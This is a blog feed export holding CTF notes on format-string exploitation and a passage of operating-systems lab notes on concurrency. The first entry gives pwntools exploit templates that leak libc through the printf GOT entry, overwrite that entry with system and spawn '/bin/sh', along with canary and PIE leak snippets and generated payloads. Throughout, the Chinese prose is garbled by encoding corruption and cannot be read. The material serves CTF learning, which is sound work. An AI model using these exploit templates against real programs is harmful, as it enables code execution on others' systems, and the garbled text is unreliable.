æ€»ç»“ä¸€ä¸‹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä¾¿äºåç»­è°ƒç”¨
</blockquote>
<span id="more"></span>
<h1 id="åŸç†-å·¥å…·">åŸç† &amp; å·¥å…·</h1>
<h2 id="åŸç†">åŸç†</h2>
<blockquote>
<p>æœ¬è´¨æ˜¯åˆ©ç”¨ printf(string) ä»»æ„åœ°å€è¯»å†™</p>
</blockquote>
<blockquote>
<p>è®°å½•ä¸€ä¸‹å¸¸ç”¨çš„æ ¼å¼</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt    :        æ ‡å‡†ä½œç”¨       ||           å¸¸ç”¨æ–¹å¼</span><br><span class="line">â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span><br><span class="line">%p     :     è¾“å‡ºæ ˆä¸Šçš„å†…å®¹     |  (è¯») æ‰¾åç§»\pie_base\canary</span><br><span class="line">%s     :   è¾“å‡ºåœ°å€æŒ‡å‘çš„å†…å®¹   ||     (è¯») æ³„éœ²libc_base</span><br><span class="line">%hhn   :   ä¿®æ”¹åœ°å€æŒ‡å‘çš„byte   |        (å†™) ä»»æ„åœ°å€å†™</span><br><span class="line">%hn/%n : ä¿®æ”¹åœ°å€æŒ‡å‘çš„2/4bytes |        (å†™) ä»»æ„åœ°å€å†™</span><br></pre></td></tr></table></figure>
<h2 id="å·¥å…·-pwntools---fmtstr_payload">å·¥å…·: Pwntools -
fmtstr_payload</h2>
<p><a href="https://docs.pwntools.com/en/stable/fmtstr.html">Pwntools -
class fmtstr</a></p>
<blockquote>
<p>æºç è§ä¸Šè¿°é“¾æ¥æˆ–æ–‡ç« æœ«å°¾çš„ Appendix</p>
</blockquote>
<p>fmtstræ˜¯ä¸€ä¸ªç±»ï¼Œæˆ‘ä»¬åªéœ€è¦ç”¨å…¶ä¸­çš„ fmtstr_payload æ¥æ„é€ æˆ‘ä»¬çš„
payload å³å¯ã€‚ç°åœ¨ç‰ˆæœ¬çš„ pwntools å·²ç»æ”¯æŒ 64 ä½çš„ æ ¼å¼åŒ–å­—ç¬¦ä¸² payload
ç”Ÿæˆäº†ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Default: numbwritten=0 , write_size=<span class="string">&#x27;byte&#x27;</span></span></span><br><span class="line">payload = fmtstr_payload(offset, writes, numbwritten=, write_size=&#x27;&#x27;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Example:</span></span><br><span class="line">context.clear(arch = &#x27;amd64&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%4$llnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%47806c%5$lln%22649c%6$hnaaaabaa\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%190c%7$lln%85c%8$hhn%36c%9$hhn%131c%10$hhnaaaab\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">context.clear(arch = &#x27;i386&#x27;)</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;int&#x27;)</span><br><span class="line">b&#x27;%322419390c%5$na\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%4919c%7$hn%42887c%8$hna\x02\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;%19c%12$hhn%36c%13$hhn%131c%14$hhn%4c%15$hhn\x03\x00\x00\x00\x02\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: 0x00000001&#125;, write_size=&#x27;byte&#x27;)</span><br><span class="line">b&#x27;c%3$naaa\x00\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(1, &#123;0x0: b&quot;\xff\xff\x04\x11\x00\x00\x00\x00&quot;&#125;, write_size=&#x27;short&#x27;)</span><br><span class="line">b&#x27;%327679c%7$lln%18c%8$hhn\x00\x00\x00\x00\x03\x00\x00\x00&#x27;</span><br><span class="line">fmtstr_payload(10, &#123;0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%125c%hhn%17c%hhn%32c%hhn%17c%hhn%203c%hhn%34c%hhn%3618c%hnacccc&gt;@@\x00cccc=@@\x00cccc?@@\x00cccc&lt;@@\x00ccccK@@\x00ccccJ@@\x00ccccH@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x404048 : 0xbadbad00&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%229c%hhn%173c%hhn%13c%hhn%33c%hhnccccH@@\x00ccccI@@\x00ccccK@@\x00ccccJ@@\x00&#x27;</span><br><span class="line">fmtstr_payload(6, &#123;0x4040 : 0xbadbad00, 0x4060: 0xbadbad02&#125;, no_dollars=True)</span><br><span class="line">b&#x27;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%212c%hhn%173c%hhn%13c%hhn%33c%hhn%39c%hhn%171c%hhn%13c%hhn%33c%hhnacccc@@\x00\x00ccccA@\x00\x00ccccC@\x00\x00ccccB@\x00\x00cccc`@\x00\x00cccca@\x00\x00ccccc@\x00\x00ccccb@\x00\x00&#x27;</span><br></pre></td></tr></table></figure>
<h1 id="ctf-ä¸­çš„é¢˜å‹">CTF ä¸­çš„é¢˜å‹</h1>
<h2 id="æ ˆä¸Š">æ ˆä¸Š</h2>
<h3 id="ä½">32ä½</h3>
<blockquote>
<p>æœ€åŸºç¡€çš„é¢˜ç›®ï¼Œfmtstr_payloadä¸€æŠŠæ¢­ï¼Œæ¨¡æ¿å¦‚ä¸‹</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç¡®è®¤åç§»é‡</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡è®¾ offset=6ï¼Œæ³„éœ²libcåŸºå€</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload    = p32(printf_got) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment"># payload  = b&#x27;%7$s&#x27; + p32(printf_got)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¡®è®¤libc</span></span><br><span class="line">printf_addr = u32(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">3</span>:])</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¥æ”¶ç¨‹åºä¿¡æ¯ï¼Œå‘ç¨‹åºå‘é€payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ææƒ</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="ä½-1">64ä½</h3>
<blockquote>
<p>ç”±äºè®¸å¤šåœ°å€åªæœ‰å…­å­—èŠ‚ï¼Œæ‰€ä»¥ä¸ºäº†å¯¹é½å…«å­—èŠ‚ï¼Œæˆ‘ä»¬éœ€è¦ç”¨''æ¥å¡«å……ï¼Œä½†''ä¼šæˆªæ–­
printf çš„è¾“å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è®© printf å…ˆè¾“å‡ºæ ¼å¼åŒ–å­—ç¬¦.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¡®è®¤åç§»é‡</span></span><br><span class="line">payload = <span class="string">&#x27;%p-&#x27;</span>*<span class="number">10</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡è®¾ offset=6ï¼Œæ³„éœ²libcåŸºå€</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload  = <span class="string">b&#x27;%7$sAAAA&#x27;</span> + p64(printf_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¡®è®¤libc</span></span><br><span class="line">printf_addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc        = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base   = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¥æ”¶ç¨‹åºä¿¡æ¯ï¼Œå‘ç¨‹åºå‘é€payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;printf_got:system_addr&#125;,numbwritten=<span class="number">0</span>,write_size=<span class="string">&#x27;short&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ææƒ</span></span><br><span class="line">io.sendline(<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="éæ ˆä¸Šbssæ®µ">éæ ˆä¸Š(BSSæ®µ)</h2>
<p>2023moeCTFçš„ç¬¬ä¸‰é“fmtå°±æ˜¯è¿™ç§é¢˜ç›®ï¼Œexpåœ¨æœ¬åœ°ï¼Œåç»­æœ‰æ—¶é—´æ›´æ–°</p>
<h2 id="ç‰¹æ®Šæƒ…å†µ">ç‰¹æ®Šæƒ…å†µ</h2>
<h3 id="ä¸€æ¬¡printfå°±è¿”å›">ä¸€æ¬¡printfå°±è¿”å›</h3>
<blockquote>
<p>printf çš„è¦æ±‚ååˆ†ä¸¥æ ¼ï¼Œé€šå¸¸æœ‰ä¸¤ç§åšæ³•</p>
</blockquote>
<ol type="1">
<li>è¦æ±‚ï¼šæ ˆä¸Šæœ‰ä¸€ä¸²å…·æœ‰ä¸‰ä¸ªå‡½æ•°çš„rbpçš„é“¾ï¼ŒNO PIEï¼Œlibcå·²çŸ¥
<ol type="1">
<li>åšæ³•ï¼šåœ¨æ ˆä¸Šå¸ƒæ»¡one_gadgetï¼Œç„¶åæ‰¾åˆ°ä¸€æ¡å¸¦æœ‰3ä¸ªrbpçš„é“¾ï¼Œä¿®æ”¹ä¸­é—´ä¸€ä¸ª
node çš„ä½å­—èŠ‚ï¼Œè®©å…¶æŒ‡å‘çš„rbpå˜ä½ï¼Œè¿›è€Œåœ¨è¿”å›æ—¶å¯ä»¥ç›´æ¥è¿”å›og</li>
<li>æœ¬è´¨: åˆ©ç”¨ ret(å®è´¨æ˜¯ pop rip) æ—¶è¿”å›æ ˆå¸§ä¸Šçš„ä¸€æ¡æŒ‡ä»¤</li>
</ol></li>
<li><a
href="https://www.freebuf.com/articles/system/385029.html">æ‰“fini_arrayï¼ˆæœªå­¦ä¹ ï¼‰</a></li>
</ol>
<h3 id="full-relro">FULL RELRO</h3>
<blockquote>
<p>FULL RELRO æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½ä¿®æ”¹ got è¡¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿®æ”¹è¿”å›åœ°å€</p>
</blockquote>
<p>è¦æ±‚ï¼šå¯ä»¥ printf
çš„æ¬¡æ•°è¾ƒå¤š(è‡³å°‘å¤šäºå››æ¬¡)ï¼Œå¯ä»¥è®©æˆ‘ä»¬å°†è¿”å›åœ°å€ä¿®æ”¹ä¸º one_gadget</p>
<h3 id="piecanary-bypass">PIE/Canary bypass</h3>
<blockquote>
<p>å‡è®¾è°ƒç”¨é“¾ä¸º main-&gt;func-&gt;printfï¼Œè€Œåœ¨ func ä¸­å­˜æ”¾ç€ fmtï¼Œåˆ™æ ˆä¸­
fmt
ä¸Šæ–¹ä¸è¿œå¤„ä¸€å®šæœ‰è°ƒç”¨printfè¯­å¥çš„ä¸‹ä¸€å¥(PC+4)ï¼Œå³è¿”å›åœ°å€ï¼Œå’Œcanary</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">å‡è®¾åç§»é‡ä¸º6ï¼Œæ ˆæ„é€ å¦‚ä¸‹</span><br><span class="line">---printfæ ˆå¸§---</span><br><span class="line">................</span><br><span class="line"> printf_canary    &lt;- offset = 3</span><br><span class="line">   printf_rbp     &lt;- offset = 4</span><br><span class="line">printf_ret_addr   &lt;- offset = 5</span><br><span class="line">---printfæ ˆå¸§---</span><br><span class="line"></span><br><span class="line">----funcæ ˆå¸§----</span><br><span class="line">      fmt         &lt;- offset = 6</span><br><span class="line">----funcæ ˆå¸§----</span><br><span class="line"></span><br><span class="line">----mainæ ˆå¸§----</span><br><span class="line">...............</span><br><span class="line">----mainæ ˆå¸§----</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ³„éœ² pie_base &amp; canary</span></span><br><span class="line">payload = &#x27;%3$p-%5$p-END&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">func_addr,canary = [int(x,16) for x in io.recvuntil(&#x27;END&#x27;)[-35:-4].split(b&#x27;-&#x27;)]</span><br><span class="line">ret_offset = </span><br><span class="line">pie_base   = func_addr - ret_offset</span><br></pre></td></tr></table></figure>
<h1 id="appendix">Appendix</h1>
<h2
id="pwnlib.fmtstr.fmtstr_payloadæºç ">pwnlib.fmtstr.fmtstr_payloadæºç </h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fmtstr_payload</span> (</span><br><span class="line">        offset,              <span class="comment"># å­—ç¬¦ä¸²åœ¨æ ˆä¸Šçš„åç§»é‡</span></span><br><span class="line">        writes,              <span class="comment"># &#123;target_addr:int_to_write&#125; è¦å†™å…¥çš„æ•°å­—</span></span><br><span class="line">        numbwritten=<span class="number">0</span>,       <span class="comment"># printf å·²ç»æ‰“å°çš„å­—ç¬¦æ•°é‡</span></span><br><span class="line">        write_size=<span class="string">&#x27;byte&#x27;</span>,   <span class="comment"># å†™å…¥å­—èŠ‚çš„å¤§å°</span></span><br><span class="line">        write_size_max=<span class="string">&#x27;long&#x27;</span>, <span class="comment"># </span></span><br><span class="line">        overflows=<span class="number">16</span>,        <span class="comment"># </span></span><br><span class="line">        strategy=<span class="string">&quot;small&quot;</span>,    <span class="comment"># é»˜è®¤smallï¼Œå¦‚æœè¿½æ±‚é€Ÿåº¦å¯ä»¥ç”¨fastæ¨¡å¼</span></span><br><span class="line">        badbytes=<span class="built_in">frozenset</span>(),  <span class="comment"># </span></span><br><span class="line">        offset_bytes=<span class="number">0</span>,      <span class="comment"># </span></span><br><span class="line">        no_dollars=<span class="literal">False</span>     <span class="comment"># æ˜¯å¦æœ‰ $ ç¬¦å·,æ¯”å¦‚ä¸ç”¨ &#x27;%996$n&#x27;</span></span><br><span class="line">    ):</span><br><span class="line"></span><br><span class="line">    sz = WRITE_SIZE[write_size]</span><br><span class="line">    szmax = WRITE_SIZE[write_size_max]</span><br><span class="line">    all_atoms = make_atoms(writes, sz, szmax, numbwritten, overflows, strategy, badbytes)</span><br><span class="line"></span><br><span class="line">    fmt = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data_offset = (offset_bytes + <span class="built_in">len</span>(fmt)) // context.<span class="built_in">bytes</span></span><br><span class="line">        fmt, data = make_payload_dollar(offset + data_offset, all_atoms, numbwritten=numbwritten, no_dollars=no_dollars)</span><br><span class="line">        fmt = fmt + cyclic((-<span class="built_in">len</span>(fmt)-offset_bytes) % context.<span class="built_in">bytes</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(fmt) + offset_bytes == data_offset * context.<span class="built_in">bytes</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;this is a bug ... format string building did not converge&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> fmt + data</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>OS - NJUOS_Note</title>
    <url>/2024/03/10/OS%20-%20NJUOS_LabNote/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
è®°å½•ä¸€ä¸‹ä¸Šè¯¾+åšå®éªŒæ—¶äº§ç”Ÿçš„é—®é¢˜ã€æ€è€ƒä¸æ”¶è·
</blockquote>
<span id="more"></span>
<h1 id="m2-plcs">[M2] plcs</h1>
<ul>
<li>åšå®Œè¿™ä¸ªå®éªŒï¼Œæ”¶è·æ¦‚æ‹¬æ¥è®²æ˜¯
<ol type="1">
<li>ç†è§£è®¡ç®—å›¾ä¸ä¾èµ–å…³ç³»ï¼Œå¹¶é€šè¿‡å®ƒæ¥å®ç°å¹¶å‘</li>
<li>LCSçš„å„ç§<a
href="https://www.geeksforgeeks.org/longest-common-subsequence-dp-4/">å®ç°æ–¹æ³•</a></li>
<li>åŠ æ·±å¯¹äº’æ–¥ä¸åŒæ­¥çš„ç†è§£ï¼Œå†™å‡ºç¬¬ä¸€ä¸ªå¹¶å‘ç¨‹åº</li>
<li>åŠ æ·±å¯¹æ¡ä»¶å˜é‡å®ç°ç”Ÿäº§è€…æ¶ˆè´¹è€…æ¨¡å‹çš„ç†è§£</li>
<li>æé«˜ç¼–ç¨‹ç´ å…»
<ol type="1">
<li>åˆ©ç”¨å®å®šä¹‰å¢å¼ºä»£ç å¯è¯»æ€§</li>
<li>åˆ©ç”¨ assert è¿›è¡Œé˜²å¾¡æ€§ç¼–ç¨‹</li>
<li>å°†å¤§ä»»åŠ¡æ‹†åˆ†æˆå¤šä¸ªå°ä»»åŠ¡</li>
</ol></li>
</ol></li>
</ul>
<h2 id="m2-1-å¹¶å‘ç¼–ç¨‹">[M2-1] å¹¶å‘ç¼–ç¨‹</h2>
<ol type="1">
<li><p>ä»»ä½•å¯èƒ½è¢«å¤šçº¿ç¨‹ä¿®æ”¹çš„å…¨å±€å˜é‡ï¼Œéƒ½åº”è¯¥ä¸Šé”ä»¥åå†å¤„ç†</p></li>
<li><p>ç”Ÿäº§è€…è´Ÿè´£ç”Ÿäº§è€Œä¸æ˜¯æ¶ˆè´¹ï¼Œé€»è¾‘è¦å¯¹</p></li>
<li><p>åœ¨ç°å®ç”Ÿæ´»ä¸­æ‰¾ä¸€äº›å®ä¾‹æ¥å¸®åŠ©ç†è§£å¹¶å‘ç¨‹åº</p></li>
<li><p>å¹¶å‘å‡½æ•° <figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">pthread_mutex_lock/pthread_mutex_unlock</span><br><span class="line"><span class="comment">// æˆ‘è®¤ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°ä¹‹é—´çš„ä»£ç è¢«ç§°ä½œâ€œä¸´ç•ŒåŒºâ€</span></span><br><span class="line"><span class="comment">// ä¸Šé”æˆ–è§£é”æ—¶æš‚åœæ—¶é—´ï¼Œä½†ä¸´ç•ŒåŒºè¿˜æ˜¯ä¼šè¢«interrupt</span></span><br><span class="line"><span class="comment">// ç”¨é”ä¿æŠ¤ä¸´ç•ŒåŒºçš„å…¨å±€å˜é‡</span></span><br><span class="line"></span><br><span class="line">pthread_cond_wait</span><br><span class="line"><span class="comment">// ç¡çœ è‡ªå·±å¹¶é‡Šæ”¾æŒæœ‰çš„é”</span></span><br></pre></td></tr></table></figure></p></li>
</ol>
<h2 id="m2-2-å®éªŒæ•°æ®">[M2-2] å®éªŒæ•°æ®</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æµ‹è¯•ç”¨ä¾‹ï¼š</span><br><span class="line">dwiufhkdscnhuifhkwufherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhbwjhefwhjedbjasbwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfheonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjegonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbqkwdbeqpdwdinjdfgryibxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjfbwjhfbhjwdbnjdfgryiegntonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjaswihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwdbfherfkuqeioqkwdbtonqinxjzxnsmhgrbfywgduydgjashbxakcdiufhwihdajisnxcbjhbwehfvewjfvhsabxjacbwjhefwhjedbjasbhjfbwjhfbhjwhfbhjwdbq